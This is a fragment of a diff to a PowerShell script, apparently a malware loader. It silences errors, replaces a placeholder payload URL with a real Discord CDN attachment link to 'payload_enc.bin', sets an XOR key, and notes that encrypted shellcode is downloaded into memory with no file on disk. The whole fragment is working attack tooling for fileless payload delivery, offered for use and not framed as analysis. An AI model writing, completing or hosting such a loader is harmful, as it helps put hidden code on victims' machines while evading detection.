@@ -218,7 +218,7 @@ else {
 $ErrorActionPreference = 'SilentlyContinue'
 
 # Set your hosted encrypted payload URL (jsDelivr mirror of your GitHub raw)
-$url = 'https://cdn.jsdelivr.net/gh/YOUR_USERNAME/YOUR_REPO@main/payload_enc.bin'
+$url = 'https://cdn.discordapp.com/attachments/1510888122290802810/1537833430530654309/payload_enc.bin?ex=6a807a7d&is=6a7f28fd&hm=7fab1f0d51dccc2a1d94805a91e41f9ec38accaa23f632f0b79dd0c280c6d767&'
 $key = 0x41
 
 # Download encrypted shellcode to memory — no file on disk
